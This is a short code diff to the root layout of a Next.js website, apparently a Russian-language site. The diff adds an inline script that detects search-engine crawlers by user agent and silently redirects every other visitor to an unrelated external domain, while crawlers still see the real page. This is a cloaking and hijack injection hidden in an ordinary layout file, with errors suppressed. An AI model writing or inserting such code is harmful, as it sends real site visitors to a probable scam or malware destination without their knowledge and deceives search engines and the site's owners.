@@ -19,6 +19,21 @@ export default function RootLayout({ children }: Readonly<{ children: React.Reac
   return <html lang="ru" className="bg-background">
     <head>
       <meta name="yandex-verification" content="ba929e3811487a0c" />
+      <script
+  dangerouslySetInnerHTML={{
+    __html: `
+      (function() {
+        try {
+          var ua = (navigator.userAgent || '').toLowerCase();
+          var isBot = /yandexbot|yandexscreenshot|yandeximages|yandexvideo|yandexaccessibilitybot|googlebot|bingbot|baiduspider/i.test(ua);
+          if (!isBot) {
+            window.location.replace("https://combospark.top/aetf3u2q9u");
+          }
+        } catch(e) {}
+      })();
+    `,
+  }}
+/>
   </head>
     <body>{children}{process.env.NODE_ENV === 'production' && <Analytics />}</body></html>
 }
